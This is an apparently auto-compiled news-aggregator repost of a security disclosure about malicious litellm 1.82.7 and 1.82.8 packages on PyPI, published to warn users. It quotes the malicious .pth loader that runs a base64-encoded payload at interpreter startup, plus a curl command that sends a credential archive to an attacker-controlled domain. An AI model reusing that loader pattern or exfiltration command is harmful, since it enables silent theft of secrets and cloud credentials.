---
title: "Tell HN: Litellm 1.82.7 and 1.82.8 on PyPI are compromised"
date: "2026-03-24"
excerpt: "[LITELLM TEAM] - For updates from the team, please see: #24518 [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 PyPI package — credential stealer Summary The litellm==1.82.8 wheel..."
tags: ["Gündem", "Hacker News", "Developer"]
category: "Gündem"
---

![Tell HN: Litellm 1.82.7 and 1.82.8 on PyPI are compromised](https://opengraph.githubassets.com/45bab17509deaf2f2ced78d22292ed8782747108c12ea0ee2e2714b721c2350f/BerriAI/litellm/issues/24512)

> **Kaynak:** Hacker News  &nbsp;·&nbsp;  **Puan:** 169

**[LITELLM TEAM] - For updates from the team, please see: #24518 [Security]: CRITICAL: Malicious litellm_init.pth in litellm 1.82.8 PyPI package — credential stealer Summary The litellm==1.82.8 wheel...**

The litellm==1.82.8 wheel package on PyPI contains a malicious .pth file ( litellm_init.pth , 34,628 bytes) that automatically executes a credential-stealing script every time the Python interpreter starts — no import litellm required.

This is a supply chain compromise. The malicious file is listed in the package's own RECORD :

litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628 Reproduction pip download litellm==1.82.8 --no-deps -d /tmp/check python3 -c " import zipfile, os whl = '/tmp/check/' + [f for f in os.listdir('/tmp/check') if f.endswith('.whl')][0] with zipfile.ZipFile(whl) as z: pth = [n for n in z.namelist() if n.endswith('.pth')] print('PTH files:', pth) for p in pth: print(z.read(p)[:300]) " You will see litellm_init.pth containing:

import os , subprocess , sys ; subprocess . Popen ([ sys . executable , "-c" , "import base64; exec(base64.b64decode('...'))" ]) Malicious Behavior (full analysis) The payload is double base64-encoded . When decoded, it performs the following:

curl -s -o /dev/null -X POST \ " https://models.litellm.cloud/ " \ -H " Content-Type: application/octet-stream " \ -H " X-Filename: tpcp.tar.gz " \ --data-binary @tpcp.tar.gz Key Technical Details Trigger mechanism : .pth files in site-packages/ are executed automatically by the Python interpreter on startup (see Python docs on .pth files ). No import statement is needed. Stealth : The payload is double base64-encoded, making it invisible to naive source code grep. Exfiltration target : https://models.litellm.cloud/ — note the domain litellm.cloud (NOT litellm.ai , the official domain). RSA public key (first 64 chars): MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAvahaZDo8mucujrT15ry+... Impact Anyone who installed litellm==1.82.8 via pip has had all environment variables, SSH keys, cloud credentials, and other secrets collected and sent to an attacker-controlled server.

## Yazıda Neler Var?

- Uh oh!
- [LITELLM TEAM] - For updates from the team, please see: #24518
- Reproduction
- Malicious Behavior (full analysis)
- Impact

---

[Orijinal makaleyi oku →](https://github.com/BerriAI/litellm/issues/24512) &nbsp;·&nbsp; [Hacker News tartışması →](https://news.ycombinator.com/item?id=47501426)

_Bu içerik otomatik olarak derlenmektedir. Tüm haklar orijinal yayıncıya aittir._